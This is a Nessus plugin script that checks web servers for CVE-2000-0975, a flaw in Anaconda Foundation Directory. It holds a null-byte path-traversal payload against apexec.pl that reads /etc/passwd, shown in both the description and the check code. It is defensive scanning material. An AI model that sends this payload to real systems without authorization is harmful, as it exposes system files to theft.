#
# This script was written by Renaud Deraison <deraison@nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10536);
 script_bugtraq_id(2338);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2000-0975");
 
 name["english"] = "Anaconda remote file retrieval";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote Anaconda Foundation Directory contains a flaw
that allows anyone to read arbitrary files with root (super-user) 
privileges, by embedding a null byte in a URL, as in :

http://www.YOURSERVER.com/cgi-bin/apexec.pl?etype=odp&template=../../../../../../..../../etc/passwd%00.html&passurl=/category/

Solution : Contact your vendor for updated software.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Anaconda Foundation Directory remote file retrieval";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
  item = string(dir,"/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd%00.html&passurl=/category/");
  buf = http_get(item:item, port:port);
  rep = http_keepalive_send_recv(port:port, data:buf);
  if( rep == NULL ) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
  	{
  	security_hole(port);
	exit(0);
	}
}
